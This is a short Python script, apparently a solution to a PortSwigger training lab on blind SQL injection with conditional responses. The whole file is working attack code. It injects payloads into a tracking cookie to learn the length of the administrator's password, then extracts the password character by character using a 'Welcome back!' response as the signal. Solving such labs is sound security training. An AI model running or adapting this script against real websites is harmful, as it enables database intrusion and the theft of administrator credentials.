# LAB 11: pORT SWIGGER SQL INJECTION 
# Blind SQL injection with conditional responses


import requests

url='your url '
characters='1234567890abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=;:'



def get_length():
    for i in range(1,101):
        cookie={'TrackingId':'','session':''}
        payload=f"' and LENGTH((select password from users where username='administrator'))={i}--"
        cookie['TrackingId'] = cookie['TrackingId']+payload
        r = requests.get(url,cookies=cookie)

        if 'Welcome back!' in r.text: 
            return i  
        
def get_data(length):
    temp=""
    for i in range(1, length+1):
        for char in characters:
            cookie={'TrackingId':'','session':''}
            payload=f"' and substring((select password from users where username='administrator'),{i},1)='{char}'--"
            cookie['TrackingId'] = cookie['TrackingId']+payload
            r = requests.get(url,cookies=cookie)
            if 'Welcome back!' in r.text:
                print('\r'+temp)
                temp+=char
                break
    return temp 

        
print("Checking length......")
length = get_length()
print(f"Password Length: {length}")

print("Dumping Data....Please be patient.")
data = get_data(length)
print(f"Got it!:{data}")



